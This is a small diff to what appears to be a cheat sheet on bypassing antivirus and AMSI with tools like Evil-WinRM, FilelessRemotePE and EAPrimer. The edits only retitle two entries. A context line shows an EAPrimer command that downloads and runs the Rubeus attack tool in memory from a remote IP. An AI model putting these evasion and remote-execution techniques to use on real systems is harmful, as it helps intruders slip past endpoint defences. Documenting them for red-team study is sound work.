@@ -18,8 +18,8 @@ II.  Examples of techniques to bypass the Microsoft Antimalware Scan Interface (
      ➤ Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 
 III. Examples of techniques to download and execute in-memory offensive Portable Executable (PE) files (without using PowerShell) to bypass AV products
-     ➤ Example of AV bypass using the tool 'FilelessRemotePE'
-     ➤ Example of AV bypass using the tool 'EAPrimer'
+     ➤ Example of AV & AMSI bypass using the tool 'FilelessRemotePE'
+     ➤ Example of AV & AMSI bypass using the tool 'EAPrimer'
 
 
 ================================================================================================================================================
@@ -731,7 +731,6 @@ c:\temp>eaprimer.exe -path=http://192.168.1.113:8080/rubeus.exe -args=currentlui
   |_|   |_|____/|____/|_____)____/(___/
 
   v1.5.0
-
 
 [*] Action: Display current LUID
 
